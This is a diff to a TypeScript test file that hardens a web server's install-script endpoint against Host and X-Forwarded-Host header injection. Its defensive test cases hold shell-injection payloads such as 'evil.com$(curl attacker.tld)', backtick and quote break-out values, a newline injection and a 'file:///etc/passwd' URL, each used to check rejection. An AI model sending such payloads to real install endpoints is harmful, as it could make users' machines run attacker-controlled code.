@@ -4,8 +4,8 @@
  * must fail loudly (not a bare 404) on builds without the pack step.
  */
 
-import { describe, test, expect, beforeAll, afterAll } from 'vitest';
-import express, { type Express } from 'express';
+import { describe, test, expect, beforeAll, afterAll, afterEach } from 'vitest';
+import express, { type Express, type Request } from 'express';
 import request from 'supertest';
 import { writeFileSync, mkdtempSync, rmSync } from 'fs';
 import { tmpdir } from 'os';
@@ -13,6 +13,10 @@ import { join } from 'path';
 
 let app: Express;
 let tmp: string;
+// Bound in beforeAll from the same dynamic import as the router — a static
+// import would load install.js before INSTALL_TGZ_PATH is set below.
+let publicOrigin: typeof import('./install.js').publicOrigin;
+let UnsafeOriginError: typeof import('./install.js').UnsafeOriginError;
 const origEnv = { PUBLIC_URL: process.env.PUBLIC_URL, INSTALL_TGZ_PATH: process.env.INSTALL_TGZ_PATH };
 
 beforeAll(async () => {
@@ -20,7 +24,10 @@ beforeAll(async () => {
   delete process.env.PUBLIC_URL;
   process.env.INSTALL_TGZ_PATH = join(tmp, 'chat-recall.tgz');
   // Env is read at module load for the tarball path — import AFTER setting it.
-  const { default: installRouter } = await import('./install.js');
+  const mod = await import('./install.js');
+  const installRouter = mod.default;
+  publicOrigin = mod.publicOrigin;
+  UnsafeOriginError = mod.UnsafeOriginError;
   app = express();
   app.use('/', installRouter);
 });
@@ -98,5 +105,78 @@ describe('GET /install/chat-recall.tgz', () => {
     const res = await request(app).get('/install/chat-recall.tgz');
     expect(res.status).toBe(200);
     expect(res.headers['content-type']).toContain('application/gzip');
+  });
+});
+
+
+/**
+ * Host-header hardening (2026-08-16).
+ *
+ * /install.sh is piped straight into `sh`, and the origin is interpolated into
+ * TGZ_URL — the URL the CLI is installed FROM. Before this, the value came
+ * from X-Forwarded-Host with no validation, so a poisoned header (or a shared
+ * cache keyed without it) could point the installer at an attacker's tarball,
+ * and shell metacharacters survived into a double-quoted assignment where
+ * `$(…)` still evaluates.
+ */
+function fakeReq(headers: Record<string, string>, protocol = 'https'): Request {
+  return {
+    protocol,
+    get(name: string) { return headers[name.toLowerCase()]; },
+  } as unknown as Request;
+}
+
+describe('publicOrigin — a request header cannot rewrite the install source', () => {
+  // The suite's beforeAll clears PUBLIC_URL; keep that invariant between cases.
+  afterEach(() => { delete process.env.PUBLIC_URL; });
+
+  test.each([
+    ['command substitution', 'evil.com$(curl attacker.tld)'],
+    ['backticks', 'evil.com`id`'],
+    ['quote break-out', 'evil.com" ; curl attacker.tld ; echo "'],
+    ['whitespace', 'evil.com foo'],
+    ['a path segment', 'evil.com/../../x'],
+    ['a newline', 'evil.com\nRUN=1'],
+    ['a smuggled scheme', 'https://evil.com'],
+  ])('rejects a Host containing %s', (_label, host) => {
+    expect(() => publicOrigin(fakeReq({ host }))).toThrow(UnsafeOriginError);
+  });
+
+  test('rejects a poisoned x-forwarded-host even when Host is clean', () => {
+    expect(() => publicOrigin(fakeReq({ host: 'good.example.com', 'x-forwarded-host': 'evil.com`id`' })))
+      .toThrow(UnsafeOriginError);
+  });
+
+  test('rejects a bogus forwarded protocol', () => {
+    expect(() => publicOrigin(fakeReq({ host: 'good.example.com', 'x-forwarded-proto': 'javascript' })))
+      .toThrow(UnsafeOriginError);
+  });
+
+  test('still accepts ordinary hosts, with and without a port', () => {
+    expect(publicOrigin(fakeReq({ host: 'recall.internal:8080' }))).toBe('https://recall.internal:8080');
+    expect(publicOrigin(fakeReq({ host: 'box.lan', 'x-forwarded-proto': 'http' }))).toBe('http://box.lan');
+  });
+
+  test('a malformed or non-http PUBLIC_URL is rejected rather than silently used', () => {
+    process.env.PUBLIC_URL = 'not a url';
+    expect(() => publicOrigin(fakeReq({}))).toThrow(UnsafeOriginError);
+    process.env.PUBLIC_URL = 'file:///etc/passwd';
+    expect(() => publicOrigin(fakeReq({}))).toThrow(UnsafeOriginError);
+  });
+});
+
+describe('GET /install.sh — response hardening', () => {
+  test('a poisoned Host yields a refusing script, never a poisoned one', async () => {
+    const res = await request(app).get('/install.sh').set('host', 'evil.com`id`');
+    expect(res.status).toBe(400);
+    expect(res.text).not.toContain('evil.com');
+    expect(res.text).toContain('PUBLIC_URL');
+  });
+
+  test('is never stored by a shared cache (the body depends on request headers)', async () => {
+    const res = await request(app).get('/install.sh').set('host', 'good.example.com');
+    expect(res.status).toBe(200);
+    expect(res.headers['cache-control']).toContain('no-store');
+    expect(res.headers['vary']).toMatch(/x-forwarded-host/i);
   });
 });
